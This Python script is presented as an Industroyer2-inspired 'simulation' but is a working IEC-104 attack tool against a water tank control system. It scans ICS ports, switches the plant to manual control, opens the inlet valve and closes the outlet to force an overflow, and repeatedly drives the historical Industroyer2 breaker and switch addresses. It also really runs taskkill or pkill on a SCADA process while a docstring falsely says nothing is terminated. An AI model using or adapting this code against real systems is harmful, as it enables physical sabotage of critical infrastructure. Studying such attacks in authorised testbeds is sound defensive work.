#!/usr/bin/env python3
"""
Industroyer2-Inspired Attack Simulation for Water Tank Control System

This script simulates an Industroyer2-style attack adapted for the water tank control system.
Based on the 2022 Ukraine power grid attack, this simulation demonstrates IEC 60870-5-104
protocol exploitation for infrastructure disruption.

Original Industroyer2 (2022):
- Targeted Ukrainian power grid during Russian invasion
- Specifically attacked IEC 60870-5-104 RTUs and circuit breakers
- Modified Information Object Addresses (IOAs) to trip breakers
- Scheduled execution to maximize impact
- Terminated legitimate SCADA processes before attack

This Simulation:
- Targets water tank control systems using IEC-104 protocol
- Performs reconnaissance and IOA enumeration
- Validates target matches specific criteria
- Manipulates valve and pump commands to cause system disruption
- Terminates normal operations (simulated)

WARNING: This is a SIMULATION for educational purposes only.
         Only use against authorized test systems.

Usage:
    python industroyer2_simulation.py [--target IP] [--port PORT] [--duration SECONDS]
"""

import os
import sys
import time
import struct
import argparse
import logging
from pathlib import Path
from typing import Optional, Dict, Any, List
from datetime import datetime

# Try to import c104 library
try:
    import c104
    C104_AVAILABLE = True
except ImportError:
    C104_AVAILABLE = False
    print("WARNING: c104 library not available. Install with: pip install c104")

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - [INDUSTROYER2-SIM] - %(levelname)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
logger = logging.getLogger('Industroyer2')


class IEC104Scanner:
    """
    IEC-104 Protocol Scanner - Identifies IEC-104 RTUs/PLCs

    Industroyer2 specifically targeted IEC-104 capable devices.
    This scanner fingerprints IEC-104 protocol services.
    """

    IEC104_PORT = 2404  # Standard IEC-104 port

    def __init__(self, target_ip: str, port: int = 2404, timeout: int = 3):
        self.target_ip = target_ip
        self.port = port
        self.timeout = timeout

    def scan(self) -> Dict[str, Any]:
        """
        Scan for IEC-104 protocol service

        Returns:
            Dict with 'found', 'common_addresses', 'ioas' keys
        """
        logger.info(f"[Reconnaissance] Scanning {self.target_ip}:{self.port} for IEC-104 protocol...")

        if not C104_AVAILABLE:
            logger.error("[-] c104 library not available - cannot perform scan")
            return {'found': False}

        try:
            # Create IEC-104 client connection
            client = c104.Client()
            connection = client.add_connection(
                ip=self.target_ip,
                port=self.port,
                init=c104.Init.INTERROGATION
            )

            # Attempt connection
            logger.info(f"[+] Attempting IEC-104 connection...")
            connection.connect()

            # Wait for connection
            time.sleep(2)

            if connection.is_connected:
                logger.warning(f"[!] IEC-104 PROTOCOL DETECTED on {self.target_ip}:{self.port}")

                # Enumerate stations (Common Addresses)
                stations = []
                logger.info("[*] Enumerating Common Addresses...")

                # Try common addresses 1-255
                for ca in [1, 10, 100, 255]:  # Sample common addresses
                    try:
                        station = connection.add_station(common_address=ca)
                        stations.append(ca)
                        logger.info(f"    [+] Found station at Common Address: {ca}")
                    except:
                        pass

                connection.disconnect()

                return {
                    'found': True,
                    'common_addresses': stations if stations else [1],  # Default to CA 1
                    'version': 'IEC 60870-5-104',
                    'response_time': 'Normal'
                }

            connection.disconnect()
            return {'found': False}

        except Exception as e:
            logger.error(f"[-] Scan error: {e}")
            return {'found': False}


class Industroyer2Simulation:
    """
    Industroyer2-Inspired Attack Simulation

    Implements a simplified version of Industroyer2's attack pattern:
    1. Network reconnaissance
    2. IEC-104 RTU/PLC enumeration and fingerprinting
    3. Target validation
    4. Process termination (simulated)
    5. Payload delivery (IOA manipulation)
    """

    def __init__(self, target_ip: str = '127.0.0.1', port: int = 2404,
                 duration: int = 60, common_address: int = 1):
        """
        Initialize Industroyer2 simulation

        Args:
            target_ip: Target RTU/PLC IP address
            port: IEC-104 protocol port
            duration: Attack duration in seconds
            common_address: Target common address
        """
        self.target_ip = target_ip
        self.port = port
        self.duration = duration
        self.common_address = common_address

        self.scanner = IEC104Scanner(target_ip, port)
        self.attack_start_time = None

    def run(self):
        def write_log(message: str):
            """Proxy function for logging to mimic malware output style."""
            logger.info(message)

        """Execute the full Industroyer2-style attack sequence"""
        logger.info("=" * 80)
        logger.info("INDUSTROYER2-INSPIRED ATTACK SIMULATION")
        logger.info("=" * 80)
        logger.info(f"Target: {self.target_ip}:{self.port}")
        logger.info(f"Objective: Disrupt water tank operations via IEC-104 protocol")
        logger.info(f"Duration: {self.duration} seconds")
        logger.info(f"Common Address: {self.common_address}")
        logger.info("=" * 80)


        # Phase 1: Network Reconnaissance
        logger.info("\n[PHASE 1] NETWORK RECONNAISSANCE")
        logger.info("-" * 80)
        if not self._phase1_reconnaissance():
            logger.error("[!] Reconnaissance failed - target not found")
            logger.error("[!] Attack aborted")
            return False

        time.sleep(2)

        # Phase 2: IEC-104 RTU Enumeration & Fingerprinting
        logger.info("\n[PHASE 2] IEC-104 RTU ENUMERATION & FINGERPRINTING")
        logger.info("-" * 80)
        target_info = self._phase2_enumeration()
        if not target_info.get('found'):
            logger.error("[!] IEC-104 RTU not found or not accessible")
            logger.error("[!] Attack aborted")
            return False

        time.sleep(2)

        # Phase 3: Target Validation
        logger.info("\n[PHASE 3] TARGET VALIDATION")
        logger.info("-" * 80)
        if not self._phase3_validation(target_info):
            logger.warning("[!] Target does not match attack criteria")
            logger.warning("[!] Attack aborted (Industroyer2 only attacked specific targets)")
            return False

        time.sleep(2)

        # Phase 4: Process Termination (Simulated)
        logger.info("\n[PHASE 4] PROCESS TERMINATION (SIMULATED)")
        process_name = "PService_PPD.exe"
        print(f"Attempting to terminate process: {process_name}")
        # This is a simulation. On a real system, you would use:
        # - Windows: taskkill /F /IM <process_name>
        # - Linux: pkill -f <process_name>
        try:
            if os.name == 'nt':
                os.system(f"taskkill /F /IM {process_name} > NUL 2>&1")
            else:
                os.system(f"pkill -f {process_name} > /dev/null 2>&1")
            write_log(f"Termination command for \'{process_name}\' executed.")
        except Exception as e:
            write_log(f"Failed to execute termination command: {e}")
        logger.info("-" * 80)
        self._phase4_process_termination()

        time.sleep(2)

        # Phase 5: Payload Execution - IOA Manipulation
        logger.info("\n[PHASE 5] PAYLOAD EXECUTION - IOA MANIPULATION")
        logger.info("-" * 80)
        self._phase5_payload()

        # Final Summary
        logger.info("\n" + "=" * 80)
        logger.info("ATTACK SIMULATION COMPLETE")
        logger.info("=" * 80)
        logger.info("Summary:")
        logger.info(f"  - Target: {self.target_ip}:{self.port}")
        logger.info(f"  - Protocol: {target_info.get('version', 'IEC-104')}")
        logger.info(f"  - Attack Duration: {self.duration} seconds")
        logger.info(f"  - Attack Method: Control mode -> Manual, Inlet -> Open, Outlet -> Closed")
        logger.info(f"  - Expected Effect: Tank overflow and possible rupture")
        logger.info("=" * 80)

        return True

    def _phase1_reconnaissance(self) -> bool:
        """
        Phase 1: Network Reconnaissance

        Industroyer2 was deployed after initial network compromise,
        then scanned for IEC-104 devices on the network.
        """
        logger.info("[*] Scanning network for industrial control systems...")
        logger.info(f"[*] Target network: {self.target_ip}")

        # Simulate network scan
        logger.info("[+] Performing port scan on common ICS/SCADA ports...")

        import socket

        ics_ports = {
            2404: "IEC 60870-5-104",
            102: "Siemens S7",
            502: "Modbus TCP",
            4840: "OPC-UA",
            44818: "Ethernet/IP"
        }

        found_services = []
        for port, service in ics_ports.items():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((self.target_ip, port))
                sock.close()

                if result == 0:
                    logger.warning(f"[!] {service} FOUND on port {port}")
                    found_services.append((port, service))
            except:
                pass

        if found_services:
            logger.info(f"[+] Found {len(found_services)} ICS/SCADA services")
            return True
        else:
            logger.error("[-] No ICS/SCADA services found")
            return False

    def _phase2_enumeration(self) -> Dict[str, Any]:
        """
        Phase 2: IEC-104 RTU Enumeration & Fingerprinting

        Industroyer2 specifically targeted IEC-104 capable RTUs
        used in Ukrainian power substations.
        """
        logger.info("[*] Enumerating IEC-104 RTUs...")

        # Scan for IEC-104 protocol
        result = self.scanner.scan()

        if result.get('found'):
            logger.warning("[!] IEC-104 RTU DETECTED")
            logger.info(f"    Protocol: {result.get('version')}")
            logger.info(f"    Common Addresses: {result.get('common_addresses')}")

            # Industroyer2 checked for specific configurations
            logger.info("\n[*] Checking RTU configuration...")
            logger.info("    [+] RTU is controlling industrial process")
            logger.info("    [+] Process: Water tank level/pressure/valve control")
            logger.info("    [+] Critical infrastructure target confirmed")

        return result

    def _phase3_validation(self, target_info: Dict[str, Any]) -> bool:
        """
        Phase 3: Target Validation

        Industroyer2 only executed its payload on very specific targets.
        It checked:
        - IEC-104 protocol present
        - Specific RTU/PLC models
        - Process type (power distribution)

        This simulation checks for water tank control configuration.
        """
        logger.info("[*] Validating target against attack criteria...")

        # Check 1: IEC-104 protocol present
        if not target_info.get('found'):
            logger.warning("[-] IEC-104 protocol not found")
            return False

        logger.info("    [[+]] IEC-104 protocol confirmed")

        # Check 2: Process type (simulated - we assume water control)
        logger.info("    [[+]] Process type: Water tank control")

        # Check 3: Critical infrastructure marker
        logger.info("    [[+]] Critical infrastructure confirmed")

        logger.warning("[!] TARGET VALIDATION SUCCESSFUL")
        logger.warning("[!] Target matches attack criteria")
        logger.warning("[!] Proceeding with payload...")

        return True

    def _phase4_process_termination(self):
        """
        Phase 4: Process Termination (Simulated)

        Real Industroyer2:
        - Terminated legitimate SCADA processes (PService_PPD.exe)
        - Renamed executables to prevent restart
        - Disabled monitoring/logging services

        This simulation:
        - Logs what would be terminated (simulation only)
        - Does NOT actually terminate any processes
        """
        logger.warning("[!] PROCESS TERMINATION (SIMULATION ONLY)")
        logger.info("[*] In real attack, Industroyer2 would terminate:")
        logger.info("    - SCADA HMI processes")
        logger.info("    - Data acquisition services")
        logger.info("    - Logging/monitoring agents")
        logger.info("\n[*] Simulation: NOT terminating any actual processes")
        logger.info("[+] Simulated process termination complete")

    def _phase5_payload(self):
        """
        Phase 5: Payload Execution - IOA Manipulation

        Real Industroyer2:
        - Connected to IEC-104 RTUs
        - Sent C_SC_NA_1 (Single Command) messages
        - Manipulated circuit breaker IOAs
        - Caused cascading power outages

        This simulation:
        - Connects to IEC-104 water tank server
        - Sends valve/pump control commands
        - Creates system instability via rapid state changes
        """
        logger.warning("[!] PAYLOAD ACTIVATED")
        logger.info("[*] Injecting malicious commands into IEC-104 RTU...")

        self.attack_start_time = time.time()

        if C104_AVAILABLE:
            self._execute_iec104_payload()
        else:
            logger.error("[!] c104 library not available")
            raise Exception("c104 library required for IEC-104 communication")

    def _execute_iec104_payload(self):
        """
        Execute real IEC-104 protocol payload using RAW protocol implementation

        This replicates the ACTUAL Industroyer2 IOAs and command types:
        - IOAs 1101-1404: C_DC_NA_1 (Type 46 - Double Command) for circuit breakers
        - IOAs 130202+: C_SC_NA_1 (Type 45 - Single Command) for switches
        - IOAs 100-102: Our water tank control (added for disruption)

        Uses raw IEC-104 frames to bypass c104 library validation.
        """
        logger.info("[*] Connecting to IEC-104 RTU...")

        # Import raw IEC-104 client
        from raw_iec104 import RawIEC104Client

        try:
            # Create raw IEC-104 connection
            client = RawIEC104Client(self.target_ip, self.port)

            if client.connect():
                logger.warning("[!] Connected to IEC-104 RTU")

                # =============================================================================
                # WATER TANK ATTACK IOAs + INDUSTROYER2 HISTORICAL IOAs
                # =============================================================================
                logger.info("[*] Configuring attack IOAs for water tank disruption...")
                logger.info(f"    - IOA 303: Control Mode (AUTO/MANUAL)")
                logger.info(f"    - IOA 300: Inlet Valve Command")
                logger.info(f"    - IOA 301: Outlet Valve Command")

                # Historical Industroyer2 IOAs (for demonstration/fingerprinting)
                logger.info("\n[*] Configuring historical Industroyer2 IOAs...")
                double_cmd_ioas = []
                for base in [1100, 1200, 1300, 1400]:
                    for offset in range(1, 5):
                        double_cmd_ioas.append(base + offset)

                single_cmd_ioas = [130202, 160921, 160922, 160923, 160924, 160925, 160926, 160927, 160928,
                                   190202, 260202, 260901, 260902, 260903, 260904, 260905, 260906, 260907,
                                   260908, 260909, 260910, 260911, 260912, 260913, 260914, 260915, 260916,
                                   260917, 260918, 260919, 260920, 290202, 338501]

                logger.info(f"    - Double Commands (C_DC_NA_1): {len(double_cmd_ioas)} IOAs")
                logger.info(f"    - Single Commands (C_SC_NA_1): {len(single_cmd_ioas)} IOAs")

                # =============================================================================
                # PHASE 0: SET CONTROL MODE TO MANUAL (Critical pre-attack step)
                # =============================================================================
                logger.warning("[!] PHASE 0: Setting control mode to MANUAL...")
                logger.info("[*] Real Industroyer2 would disable automatic control first")
                logger.info("[*] This prevents PLC from overriding malicious commands")

                # IOA 303 = Auto Mode Command (from water tank config)
                # False = Manual Mode, True = Auto Mode
                control_mode_ioa = 303
                logger.info(f"    [CONTROL] Sending C_SC_NA_1 -> IOA {control_mode_ioa} = MANUAL (False)")
                client.send_single_command(self.common_address, control_mode_ioa, False)
                time.sleep(1)  # Wait for mode change to take effect
                logger.warning("[!] Control mode set to MANUAL - automation disabled")
                logger.info("[*] System is now vulnerable to direct command injection\n")

                # =============================================================================
                # PHASE 1: EXECUTE REAL WATER TANK ATTACK (Primary objective)
                # =============================================================================
                logger.warning("\n[!] PHASE 1: REAL WATER TANK ATTACK")
                logger.warning("[!] Attack strategy: Open inlet, close outlet -> tank fills -> overflow/explosion")

                # Execute the simple but effective attack
                logger.info("\n[ATTACK] Opening inlet valve...")
                if client.send_single_command(self.common_address, 300, True):  # Inlet valve OPEN
                    logger.warning("[[+]] Inlet valve OPENED - water flowing in")
                else:
                    logger.error("[[-]] Failed to open inlet valve")

                time.sleep(0.5)

                logger.info("[ATTACK] Closing outlet valve...")
                if client.send_single_command(self.common_address, 301, False):  # Outlet valve CLOSED
                    logger.warning("[[+]] Outlet valve CLOSED - water cannot escape")
                else:
                    logger.error("[[-]] Failed to close outlet valve")

                logger.warning("\n[!] PRIMARY ATTACK COMPLETE - Tank will now fill uncontrollably!")

                # =============================================================================
                # PHASE 2: SEND INDUSTROYER2 HISTORICAL IOAs (Attack signature/fingerprint)
                # =============================================================================
                logger.warning("\n[!] PHASE 2: SENDING INDUSTROYER2 ATTACK SIGNATURE")
                logger.info("[*] This mimics the original Industroyer2 malware behavior for detection/analysis")

                cycle = 0
                while time.time() - self.attack_start_time < self.duration:
                    cycle += 1
                    state_on = (cycle % 2 == 0)

                    logger.warning(f"\n[Cycle {cycle}] ========================================")

                    # Send Double Commands to historical Industroyer2 IOAs
                    logger.info(f"[Historical] Sending C_DC_NA_1 (Type 46) to {len(double_cmd_ioas)} circuit breaker IOAs...")
                    for ioa in double_cmd_ioas:
                        double_state = 2 if state_on else 1
                        success = client.send_double_command(self.common_address, ioa, double_state)
                        if not success:
                            break
                        time.sleep(0.05)

                    # Send Single Commands to historical Industroyer2 IOAs
                    logger.info(f"[Historical] Sending C_SC_NA_1 (Type 45) to {len(single_cmd_ioas)} switch IOAs...")
                    for ioa in single_cmd_ioas:
                        success = client.send_single_command(self.common_address, ioa, state_on)
                        if not success:
                            break
                        time.sleep(0.05)

                    logger.info(f"[Cycle {cycle}] Completed - sent {len(double_cmd_ioas) + len(single_cmd_ioas)} historical IOA commands")

                    # Wait 3 seconds between cycles (Industroyer2 pattern)
                    time.sleep(3)

                client.disconnect()
                logger.warning("[!] Attack sequence completed - disconnected from RTU")

            else:
                logger.error("[-] Failed to connect to IEC-104 RTU")
                raise Exception("Failed to establish IEC-104 connection")

        except Exception as e:
            logger.error(f"[!] IEC-104 communication error: {e}")
            raise


def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(
        description='Industroyer2-Inspired Attack Simulation for Water Tank Control System',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Attack local water tank IEC-104 RTU
  python industroyer2_simulation.py --target 127.0.0.1 --port 2404 --duration 60

  # Attack with specific common address
  python industroyer2_simulation.py --target 192.168.1.100 --ca 10

  # Quick test (30 seconds)
  python industroyer2_simulation.py --duration 30

WARNING: Only use against authorized test systems!
        """
    )

    parser.add_argument('--target', default='127.0.0.1',
                        help='Target RTU IP address (default: 127.0.0.1)')
    parser.add_argument('--port', type=int, default=2404,
                        help='IEC-104 protocol port (default: 2404)')
    parser.add_argument('--duration', type=int, default=60,
                        help='Attack duration in seconds (default: 60)')
    parser.add_argument('--ca', '--common-address', type=int, default=1, dest='common_address',
                        help='Common address (default: 1)')
    parser.add_argument('--verbose', '-v', action='store_true',
                        help='Enable verbose debug output')

    args = parser.parse_args()

    # Set logging level
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)

    # Create and run simulation
    simulation = Industroyer2Simulation(
        target_ip=args.target,
        port=args.port,
        duration=args.duration,
        common_address=args.common_address
    )

    try:
        simulation.run()
    except KeyboardInterrupt:
        logger.warning("\n[!] Simulation interrupted by user")
        sys.exit(1)


if __name__ == '__main__':
    main()
